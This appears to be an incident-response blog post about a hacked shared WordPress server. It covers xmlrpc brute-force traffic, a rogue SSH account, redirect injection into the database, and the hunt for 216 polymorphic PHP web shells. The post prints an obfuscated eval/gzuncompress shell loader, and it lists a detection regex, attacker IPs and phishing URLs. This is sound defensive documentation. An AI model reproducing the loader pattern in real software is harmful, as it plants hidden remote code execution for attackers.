---
title: "Polymorphic Web Shell — Incident Response"
date: 2026-06-27
author: 8iker_4n0n
category: ir-report
severity: high
mitre_tags:
  - T1505.003
  - T1027
  - T1059.004
  - T1083
  - T1140
  - TA0003
  - T1090
  - T1095
  - T1571
  - T1070.004
ioc_summary:
  - "REGEX: '\\( __FILE__ \\),-[0-9]+'"
  - "Path: /home/REDACTED/public_html/yichka1/urystbv/fcbdgrl/index.php"
  - "Path: /home/REDACTED/public_html/zinjscd/pcutqaz/bagdkew/tool.php"
  - "Path: /home/REDACTED/public_html/well-known/pki-validation/e/f/e/h/fjstxenpzkw.php"
  - "URL: https://urshort.com/RQBmGWIof0r3"
  - "URL: https://ushort.dev/FxxmbnZiW0r2"
  - "URL: https://ushort.today/TVsyoRgYi0r0"
  - "URL: https://ushort.observer/BqgMaGQbM0r5"
  - "URL: https://ushort.company/PhPoDVpvi0r9"
tags:
  - webshell
  - polymorphic
  - php
  - T1505.003
  - T1027
  - T1140
  - TA0003
  - wordpress
  - cpanel
  - whm
  - xmlrpc.php
  - phising
  - redirect
---

# Polymorphic Web Shell — Incident Response

## Overview

The following report is a condensed write-up regarding an incident response on a compromised server I was tasked with securing after the fact.
A shared-hosting web server managed via cPanel/WHM, hosting multiple WordPress sites across several accounts, was identified as compromised. Indicators point to a multi-account breach involving server-side web shells and large-scale content injection.  

The malware found was not detected by using any AV scans or security plugins, but through manual investigation and regex. All connections to the compromised server was done through my own private VPN connection to hide my own public IP address. I intentionally exclude some discoveries from

The investigation prioritised, in order: evidence preservation, assessment of live attacker activity, containment, and root-cause identification.

Shout out to the following researchers who's content made this possible:  
**John Strand, Low Level, Hack The Clown, John Hammond, Nahamsec, Tomnomnom**

Disclaimer: Both **Gemini 3.1 Pro** and **Claude Opus 4.8** were used to assist me in the investigation. The AI models were used to help me with research on discoveries made and to support me with additional commands I used to discover anomalies. 

> See the companion [Malware Analysis](../malware-analysis/2026-06-27-polymorphic-webshell-analysis.md) for breakdown of the shell's obfuscation and polymorphism mechanisms.

---

## Introduction
The client contacted me, explaining that his server (which I had not seen before) has been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to `https://ushort.dev` and other similar URLs.  

I intentionally left out some parts of this investigation to prevent a bloated blog. But one of the early actions I took when accessing the server via SSH was to grep for the `ushort` string in the webroot of one of the affected sites to see what files come up. This only reveal temporary logs from cPanel based on actions already taken by the user which is what lead me to take a different approach.

---

## Log analysis
The WHM management interface allowed me to view active processes and network logs. The active processes and first view logs did not reveal anything. When looking through the `Daily Process Log` in WHM, I saw a sudden spike (23%) in the previous day's (June 18 2026) memory usage. This memory usage came from the `httpd` process. Now 23% is not much for a web server but when compared to the current day (0.3%) it seemed very odd.

I then looked at the bandwidth usage for each month by site. This then revealed a massive amount of data usage for about 7 sites. As the sites are not hosting video content or image downloads, this seemed strange so I jumped back many months until I saw a drop in bandwidth usage. I discovered that prior to February 2026, the average bandwidth usage was between **7GB** to **9GB** but in Feburary there was an additional 20GB. Looking through the other months, the maximum usage for one particular site was **32.26GB**.

Upon further investigation, I found that the most targeted file in the requests sent was `xmlrpc.php`, about 100,000+ requests within a 3 month span. I remember from the past this this was a vulnerable file in the past. I did a quick search and discovered that this legacy file has been used in past exploits to brute force user accounts. This is what I believe was used to brute-force user accounts and gain access to file upload capabilities through an administrator account.

---

## Looking For Established Connections and Odd User Accounts
Before continuing, I told myself not to underestimate the attackers and be sure of my next actions. The next thing I was using the `Terminal` function in WHM to get a root shell. I then ran the following commands to check for strange user accounts.
```bash
# Find user accounts with bash shell access
grep "/bin/bash" /etc/passwd
sort -n -t: /etc/passwd | grep -vE "nologin|noshell|false|halt|shutdown|sync"

# This shows the last authenticated SSH logins
last

# Check if the user creation is in the root's bash history
grep "USERNAME" ~/.bash_history
```
I found a user that stood out to me. I then found the user creation command in the root user's bash history account. The bash history had unix timestamps enabled and that user was created (according to the history timestamp) a minute before two other accounts which I know to be official.
But when looking at `last` command's output, I enumerated their IP address with `ip-api.com` JSON API which showed me the user was connecting from a static IP in Washington DC. 

None of the official users were in the USA so I flagged it and confirmed with my client. No one to his knowledge was operating out of the States. I didn't take any action on the user account yet as I wanted to script the removal of any connections and user accounts to prevent any counter attacks should the attackers be actively monitoring such actions.

I then looked at all the processes and their child processes but this didn't reveal anything interesting. But the active network connections showed ESTABLISHED connections to foreign IP addresses (listed under 'Attacker IPs'). I found active connections on port 111 and immediately killed the process and masked the service.
```bash
# Processes and there child processes
ps -auxf

# All open files showing process IDs and Connection status - Credit: John Strand
lsof -i -P
```
I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geolock the server to disconnect any foreign clients immediately making it easier to work on and clean up. I then added the geolock and locked some of the ports I saw which were open and added the global xmlrpc deny rule, and blocked and removed the strange SSH user account.

---

## Finding Persistence

I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts.
 
The focus then turned to the /home directory and Claude gave me the following line:
```bash
stat /home/user/public_html/shell.php
```
My first thought was "who would be stupid enough to leave a malicious script on a server named script.php?". I laughed and said to myself, "What the hell, let's just see what comes up"
```bash
# Find all the files under the /home directory named script
find /home -name "script.php" > script_file_find_output.txt
```
So I looked at the output and about the 10th line down, one line immediately stood out:  
**`/home/REDACTED/cpmove.psql.1312886056/teaniou/ytdkrwn/iazvlpc/shell.php`**  
This did not look normal but rather looked like an attempt to make it look like a temporary path of sorts or was a randomly generated path. I then opened it up with `vi` and had a look...
At this point my heart started racing from excitement, I'm sure we all know the feeling. This is what I saw:
```php
<?php
$JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr';$DPAQ='st'.'r'.''.'re'.'place';$TprW='e'.'xit';eval($YrdE($DPAQ('xpkzchjbsq','>',$DPAQ('qpfxhbaelk','<',$esyt($JIzk( _FILE_ ),-217718)))));$TprW(0);
?>
```
BOOM! Text book obfuscation, great. I then went back to my text file and looked for more paths like it and found another 3 of them:  
**`/home/REDACTED/public_html/images/npmrlch/cywartd/vjaqbug/shell.php`**  
**`/home/REDACTED/public_html/modules/mod_login/elhywdo/cuywi1b/bwsax1e/shell.php`**  
**`/home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php`**  
In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all **`(__FILE__),-OFFSET`**  
I then asked Claude to give me the best way to find all of these files across the file system using this regex **`\( __FILE__ \),-[0-9]+`** 
```bash
# Find all the php files with this pattern in them under first all the webroot folders then the filesystem
grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/ >> possible_malware.txt
grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" / >> possible_malware.txt

# Using some vi magic, I quickly got a unique list
:%!sort -u
```
I started with only the webroots but after seeing how quickly it output results outside of what I had already found, I then switched to the root filesystem. A few minutes later, I sat with a 216 unique instances across the file system.  
> See the companion [Malware Analysis](../malware-analysis/2026-06-27-polymorphic-webshell-analysis.md) for breakdown of the shell's obfuscation and polymorphism mechanisms.

---

## Cleaning Up The Database  
The next thing I had to check were the database tables. The following tables were found to have the `ushort` redirects in them:

- wp-posts
- wp-options

In wp-options the **home** column had a `ushort` link in it, redirecting any visitor to the phising site.
A custom bash script was used to clean up all the database entries.
```bash
#!/usr/bin/bash
WP_CLI="/usr/local/bin/wp"
REGEX_META='<meta http-equiv="refresh" content="0; url=https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+" \/>\s*'
REGEX_SCRIPT='<script>window\.location\.href = "https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+";<\/script>\s*'

declare -A SEEN

for user in $(ls -1 /var/cpanel/users | grep -v system); do
  for user_file in /var/cpanel/userdata/$user/*; do
    # only JSON cache files parse; skip YAML/_SSL silently
    jq -e . "$user_file" >/dev/null 2>&1 || continue
    DOCROOT=$(jq -r '.documentroot // empty' "$user_file" 2>/dev/null)
    PHP_VER=$(jq -r '.phpversion // empty'   "$user_file" 2>/dev/null)
    [[ -z "$DOCROOT" || -z "$PHP_VER" ]] && continue
    [[ -n "${SEEN[$DOCROOT]}" ]] && continue          # dedupe docroots
    SEEN[$DOCROOT]=1

    PHP_CLI="/opt/cpanel/$PHP_VER/root/usr/bin/php"
    RUN="sudo -u $user /bin/bash -c"

    # skip non-WP docroots silently
    $RUN "$PHP_CLI $WP_CLI core is-installed --path='$DOCROOT'" 2>/dev/null || continue

    meta=$($RUN "$PHP_CLI $WP_CLI search-replace '$REGEX_META' '' --path='$DOCROOT' --regex --regex-flags='i'" 2>/dev/null \
           | grep -oiP 'Success:.*?\K\d+')
    scr=$($RUN  "$PHP_CLI $WP_CLI search-replace '$REGEX_SCRIPT' '' --path='$DOCROOT' --regex --regex-flags='i'" 2>/dev/null \
           | grep -oiP 'Success:.*?\K\d+')

    # ground truth: distinct infected post rows
    PREFIX=$($RUN "$PHP_CLI $WP_CLI config get table_prefix --path='$DOCROOT'" 2>/dev/null)
    rows=$($RUN "$PHP_CLI $WP_CLI db query \"SELECT COUNT(*) FROM ${PREFIX}posts WHERE post_content LIKE '%ushort.%'\" --skip-column-names --path='$DOCROOT'" 2>/dev/null)

    printf '%-12s %-40s META=%-5s SCRIPT=%-5s ROWS=%s\n' \
           "$user" "$DOCROOT" "${meta:-0}" "${scr:-0}" "${rows:-0}"
  done
done
```
---

## Conclusion
At this point it was about 4AM and had to get ready for my day job. I compiled my hours,findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.  

If anything seen in this blog is incorrect, can be improved or you would like to offer any advice, I welcome it. I'd rather be wrong and learn, than to remain ignorant.

---

## Environment
| Item | Detail |
|---|---|
| Operating System | AlmaLinux 9.8 (Olive Jaguar) |
| Hosting Model | Shared hosting, multiple cPanel accounts |
| Application | WordPress (mixed cored and plugin versions across sites)

---

## Timeline

| Time (UTC) | Event |
|---|---|
| 2026-06-19 19:28 | Analysis of WHM active processes and network logs |
| 2026-06-19 20:47 | Discovery of HTTP traffic anomalies |
| 2026-06-19 21:19 | Discovery of most requested file via HTTP requests |
| 2026-06-19 23:45 | Discovery of polymorphic shell |
| 2026-06-20 00:33 | Quarantine, archival and removing of all malware found |
| 2026-06-20 01:54 | Investigation stopped, report sent to client |

---

## Malicious Scripts (Truncated List)
- `/home/REDACTED/public_html/well-known/pki-validation/e/e/f/c/dphgrvcoqms.php`
- `/home/REDACTED/public_html/well-known/pki-validation/e/e/f/c/ywqdmhuantx.php`
- `/home/REDACTED/public_html/wp-content/uploads/gfkijlv/ptjqgki/bvcegip/index.php`
- `/home/REDACTED/public_html/wp-content/uploads/gfkijlv/ptjqgki/bvcegip/t.php`
- `/home/REDACTED/public_html/wp-content/uploads/vexmoyr/1tqbuiz/vcqfbyx/fox.php`
- `/home/REDACTED/public_html/wp-content/uploads/vexmoyr/1tqbuiz/vcqfbyx/index.php`

---

## Attacker IPs
- 45.79.207.110 - Linode New York
- 61.145.190.218 - Shanghai
- 92.241.27.49 - Russia
- 179.83.134.101 - Brazil
- 172.104.210.105 - Linode New York
- 60.172.54.36 - Shanghai
- 47.128.35.71 - Singapore
- 186.193.48.164 - Brazil
- 47.128.36.127 - Singapore
- 172.104.210.105 - Linode New York
- 45.79.207.110 - Linode New York
- 20.194.168.128 - Tokyo
- 185.177.72.54 - France
- 185.255.212.178 - Bulgaria
- 4.194.4.87 - Singapore
- 51.75.119.0/24 - France
- 83.186.105.193 - Sweden
- 211.198.128.124 - Korea
- 5.152.145.54 - Italy
- 41.230.187.122 - Tunisia
- 186.239.41.102 - Brazil
- 5.32.107.6 - Dubai
- 27.66.241.43 - Bangkok
- 111.198.53.188 - Shanghai
- 113.67.8.22 - Shanghai
- 45.148.10.121 - Amsterdam
- 185.177.72.54 - Paris

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Notes |
|---|---|---|---|
| Persistence | T1505.003 | Server Software Component: Web Shell | Primary persistence mechanism |
| Defense Evasion | T1027 | Obfuscated Files or Information | Polymorphic / multi-layered compression and encoding |
| Execution | T1059.004 | Unix Shell | Command execution via shell |
| Discovery | T1083 | File and Directory Discovery | Filesystem enumeration post-compromise |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Runtime eval chain decoding obfuscated payload |
| Command and Control | T1095 | Non-Application Layer Protocol | Reverse shell using raw socket to bypass inbound firewall rules |
| Command and Control | T1090 | Proxy | Traffic routed through intermediary nodes (Linode instances) |
| Command and Control | T1571 | Non-Standard Port | C2 callback observed on non-standard port |
| Defense Evasion | T1070.004 | Indicator Removal on Host: File Deletion | The malware compiled and deleted it's source code |
| Discovery | T1049 | System Network Connections Discovery | Mapped out active network interfaces and connections |
| Discovery | T1016 | System Network Configuration Discovery | Identified listening services and established connections |


---

## Indicators of Compromise
- Foreign IP connecting to SSH shell
- 216 polymorphic PHP web shells located across the hosted account web roots.
- Database content injection: WordPress post rows seeded with redirect payloads pointing to ushort.* domains. Each infected row observed to carry two payload variants — a `<meta http-equiv="refresh"> redirect and a <script>window.location.href>` redirect.
- Removed injected redirects in 17560 PHP files found on disk via bash script.
- Injection scale on one account (REDACTED) measured at 818 infected post rows (1,636 total payload strings, i.e. both variants per row).
- Established connections to port 111 RPC from foreign addresses (Linode instances) 

---

## Remediation

- Authored a WP-CLI script to enumerate and (on live pass) remove the ushort.* redirect payloads across hosted WordPress installations, producing per-account counts of meta, script, and distinct infected rows.
- Block attacker IP(s); disable compromised accounts; remove live phishing/shell pages once evidence was preserved.
- Firewall enabled and ports locked down.
- Global rule to disable xmlrpc.php
- Changing of all passwords for user accounts, databases and administrative accounts
- Disabled C Compiler access - this was enabled for unpriviledged users - WHM setting
- Shell fork bomb protection enabled - WHM setting

---

## References

- [MITRE TA0003 — Persistence (Tactic)](https://attack.mitre.org/tactics/TA0003/)
- [MITRE T1505.003 — Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
- [MITRE T1140 — Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
- [MITRE T1059.004 — Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [MITRE T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
- [MITRE T1049 — System Network Connections Discovery](https://attack.mitre.org/techniques/T1049/)
- [MITRE T1016 — System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)
- [MITRE T1090 — Proxy](https://attack.mitre.org/techniques/T1090/)
- [MITRE T1095 — Non-Application Layer Protocol](https://attack.mitre.org/techniques/T1095/)
- [MITRE T1571 — Non-Standard Port](https://attack.mitre.org/techniques/T1571/)
- [MITRE T1070.004 — Indicator Removal: File Deletion](https://attack.mitre.org/techniques/T1070/004/)
- [Companion Malware Analysis](../malware-analysis/2026-06-27-polymorphic-webshell-analysis.md)
